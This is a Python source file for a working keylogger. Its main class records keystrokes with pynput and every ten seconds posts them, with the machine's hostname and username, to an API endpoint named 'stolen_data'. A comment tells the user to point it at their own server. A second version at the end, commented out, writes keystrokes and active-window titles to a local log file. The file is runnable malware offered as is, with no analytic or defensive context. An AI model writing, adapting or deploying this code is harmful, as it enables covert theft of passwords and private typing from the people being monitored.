from pynput import keyboard
import threading
import time
import os
import json
import requests
import socket
import time

API_ENDPOINT = "http://localhost:3001/api/v1/data/get/stolen_data"  # Change to your API
BATCH_SEND_INTERVAL = 10

class Keylogger:
    def __init__(self):
        self.refined_buffer = [] 
        self.running = True
        self.hostname = socket.gethostname()
        self.username = os.getlogin()
        threading.Thread(target=self.batch_sender, daemon=True).start()

    def refine_key(self, key):
        try:
            if key == keyboard.Key.backspace:
                if self.refined_buffer:
                    self.refined_buffer.pop()
            elif key == keyboard.Key.enter:
                self.refined_buffer.append('\n')
            elif key in [keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.alt]:
                pass
            elif isinstance(key, keyboard.Key):
                pass
            else:
                self.refined_buffer.append(key.char)
        except AttributeError:
            pass

    def on_press(self, key):
        self.refine_key(key)

    def batch_sender(self):
        while self.running:
            time.sleep(BATCH_SEND_INTERVAL)
            if self.refined_buffer:
                refined_text = ''.join(self.refined_buffer)
                self.send_to_api(refined_text)
                self.refined_buffer.clear()

    def send_to_api(self, text):
        try:
            payload = {
                "keystrokes": text,
                "hostname": self.hostname,
                "username": self.username ,
                "password": "ghghhghg12345678!@#$%^&*"
            }
            headers = {'Content-Type': 'application/json'}
            response = requests.post(API_ENDPOINT, data=json.dumps(payload), headers=headers)
            print(f"Data sent: {response.status_code}")
        except Exception as e:
            print(f"Failed to send: {e}")

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    kl = Keylogger()
    kl.start()


'''from pynput import keyboard
import platform
import subprocess
import threading
import time
import os

class Keylogger:
    def __init__(self, log_file="keylog.txt", flush_interval=5):
        self.log_file = log_file
        self.flush_interval = flush_interval
        self.buffer = []
        self.last_window = None
        self.os_type = platform.system()
        self.running = True
        threading.Thread(target=self.flush_periodically, daemon=True).start()

    def get_active_window(self):
        try:
            if self.os_type == "Windows":
                import pygetwindow as gw
                return gw.getActiveWindow().title
            elif self.os_type == "Linux":
                return subprocess.check_output(
                    ['xdotool', 'getactivewindow', 'getwindowname']
                ).decode('utf-8').strip()
        except:
            return "Unknown Window"

    def on_press(self, key):
        current_window = self.get_active_window()

        if current_window and current_window != self.last_window:
            self.last_window = current_window
            timestamp = time.ctime()
            self.buffer.append(f"\n\n[Window: {current_window} | {timestamp}]\n")

        try:
            self.buffer.append(key.char)
        except AttributeError:
            self.buffer.append(f"[{key}]")

    def flush_periodically(self):
        while self.running:
            if self.buffer:
                with open(self.log_file, "a") as f:
                    f.writelines(self.buffer)
                self.buffer.clear()
            time.sleep(self.flush_interval)

    def start(self):
        print(f"Keylogger running on {self.os_type}...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()'''
